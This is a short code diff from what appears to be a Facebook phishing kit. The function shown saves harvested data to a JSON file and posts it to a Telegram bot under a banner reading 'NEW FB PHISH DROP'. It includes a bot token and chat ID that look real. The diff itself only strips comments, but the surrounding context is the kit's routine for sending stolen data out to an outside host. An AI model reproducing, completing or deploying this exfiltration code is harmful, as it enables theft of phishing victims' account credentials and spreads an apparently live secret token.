@@ -23,8 +23,8 @@ def store_info_here(collect_info, single_info):
         json.dump(collect_info, paste_info, indent=4)
 
     # Send to Telegram
-    token = "7354669720:AAFlBMYMUjALbbAmmCtmL273ah2oP9m1rhw"      # your real bot token
-    chat_id = "6372101595"                  # your real chat_id
+    token = "7354669720:AAFlBMYMUjALbbAmmCtmL273ah2oP9m1rhw" 
+    chat_id = "6372101595"                  
 
     message = f"""
 🪬 NEW FB PHISH DROP 🪬
@@ -41,7 +41,7 @@ def store_info_here(collect_info, single_info):
 
     try:
         response = requests.post(url, data=data)
-        print(response.text)  # For debugging
+        print(response.text)  
     except Exception as e:
         print("Error sending to Telegram:", e)
 
